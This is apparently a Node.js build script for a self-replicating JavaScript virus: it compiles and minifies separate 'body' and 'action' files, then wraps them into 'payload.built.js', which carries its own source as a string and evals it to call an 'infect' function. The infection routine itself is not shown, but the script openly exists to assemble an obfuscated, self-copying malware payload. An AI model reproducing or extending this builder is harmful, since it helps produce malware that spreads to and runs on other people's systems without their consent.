const fs   = require( "fs-extra" );
const exec = require( "child-process-promise" ).exec;

function getCopyOfVirus( virusSrc, action ) {
    const esc = str => str
        .replace(/[\\"]/g, "\\$&")
        .replace(/[\n\r]/g, "\\n");

    return `
(function() {
    var virusSrc = "${esc(virusSrc)}";
    var action   = "${esc(action)}";
    (()=>null)(action);
    eval( virusSrc + "infect( virusSrc, action )" );
})();`;
}


async function build() {

    await fs.ensureDir( ".build" );

    for( var key of [ "body", "action" ] ) {
        var src      = `${key}.js`;
        var compiled = `.build/${key}.compiled.js`;
        var minified = `.build/${key}.min.js`;

        await exec( `cat ${src} | ./node_modules/.bin/babel -o ${compiled} --presets es2015` );
        await exec( `./node_modules/.bin/uglifyjs --mangle --compress -o ${minified} ${compiled}` );
    }
        
    var tgt = "payload.built.js";

    var virusDef = await fs.readFile( ".build/body.min.js", "utf-8" );
    var action = await fs.readFile( ".build/action.min.js", "utf-8" );
    await fs.writeFile( tgt, getCopyOfVirus( virusDef, action ) );
}

build();
